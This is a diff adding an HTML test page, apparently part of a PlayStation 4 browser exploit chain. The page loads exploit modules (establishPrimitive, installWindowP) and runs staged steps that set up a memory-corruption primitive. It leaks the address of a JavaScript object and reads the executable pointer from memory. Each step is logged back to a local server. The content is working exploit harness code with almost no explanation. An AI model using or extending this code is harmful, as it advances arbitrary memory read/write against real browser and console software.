@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>ps4 trace 3 - promote</title>
+<style>
+  html,body{margin:0;background:#0b0d10;color:#c8ced8;font:14px/1.45 monospace;}
+  #wrap{padding:16px;}
+  #state{font-size:22px;font-weight:700;margin:0 0 10px;}
+  #out{white-space:pre-wrap;background:#11151b;border:1px solid #1e2732;
+       border-radius:5px;padding:10px 12px;height:calc(100vh - 100px);
+       overflow-y:auto;}
+  .ok{color:#7fd0a0;} .bad{color:#d08a7f;} .warn{color:#d8c07f;}
+</style>
+</head>
+<body>
+<div id="wrap">
+  <div id="state">trace 3 - promote</div>
+  <div id="out"></div>
+</div>
+<script type="module">
+import { establishPrimitive } from "./core.js?v=trace1";
+import { installWindowP, pairStatus } from "./mem.js?v=trace1";
+
+const outEl = document.getElementById("out");
+const stateEl = document.getElementById("state");
+const lines = [];
+function log(t, d) {
+    const s = t + (d ? "  " + d : "");
+    lines.push(s);
+    outEl.textContent = lines.join("\n");
+    outEl.scrollTop = outEl.scrollHeight;
+    try {
+        const x = new XMLHttpRequest();
+        x.open("POST", "t", true);
+        x.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        x.send("TRACE3&tag=" + encodeURIComponent(t) + "&detail=" + encodeURIComponent(d||""));
+    } catch(e){}
+}
+function state(t,c){ stateEl.textContent=t; stateEl.className=c||""; }
+
+(async function(){
+    try {
+        state("STEP 1: primitive");
+        log("T3-START", "heap=" + (performance.memory
+            ? (performance.memory.usedJSHeapSize/0x100000).toFixed(1) + "MB" : "?"));
+
+        const carrier = await establishPrimitive({
+            maxAttempts: 3,
+            onEvent: function(tag, detail, attempt) {
+                log("PRIM:" + tag, (attempt != null ? "["+attempt+"] " : "") + (detail || ""));
+            }
+        });
+        log("T3-PRIM-OK", "");
+        state("STEP 1 OK", "ok");
+        await new Promise(r => setTimeout(r, 500));
+
+        state("STEP 2: installWindowP(promote:true)");
+        log("T3-2-BEFORE", "calling installWindowP with promote:true");
+        installWindowP(carrier, {
+            promote: true,
+            onEvent: function(tag, detail) {
+                log("MEM:" + tag, detail || "");
+            }
+        });
+        log("T3-2-AFTER", "installWindowP returned");
+        log("T3-2-PAIR", "state=" + pairStatus.state + " promoted=" + pairStatus.promoted
+            + " stage=" + pairStatus.stage);
+        if (pairStatus.error) log("T3-2-ERR", pairStatus.error);
+        log("T3-2-P", "window.p=" + (typeof window.p) + " leakval=" + (typeof (window.p && window.p.leakval)));
+        state("STEP 2 OK", "ok");
+        await new Promise(r => setTimeout(r, 500));
+
+        state("STEP 3: use p.leakval/read8/write8");
+        log("T3-3-A", "leakval(Math.expm1)");
+        const cell = p.leakval(Math.expm1);
+        log("T3-3-B", "cell=" + cell);
+
+        log("T3-3-C", "read8(cell+0x18) [m_executable]");
+        const ex = p.read8(cell.add32(0x18));
+        log("T3-3-D", "executable=" + ex + " hi=0x" + (ex.hi>>>0).toString(16));
+        state("STEP 3 OK", "ok");
+        await new Promise(r => setTimeout(r, 500));
+
+        state("STEP 4: idle 3s", "warn");
+        log("T3-4-IDLE", "waiting 3s");
+        for (let i = 0; i < 6; i++) {
+            await new Promise(r => setTimeout(r, 500));
+            log("T3-4-TICK", "t=" + ((i+1)*500) + "ms heap="
+                + (performance.memory
+                    ? (performance.memory.usedJSHeapSize/0x100000).toFixed(1) + "MB" : "?"));
+        }
+
+        state("DONE - SURVIVED (promote)", "ok");
+        log("T3-DONE", "installWindowP(promote:true) survived. "
+            + "If both traces survive, the bug is in the workers setup.");
+    } catch (e) {
+        log("T3-THREW", (e && e.message) ? e.message : String(e));
+        log("T3-STACK", e && e.stack ? String(e.stack).slice(0,300) : "");
+        state("FAILED - see log", "bad");
+    }
+})();
+</script>
+</body>
+</html>
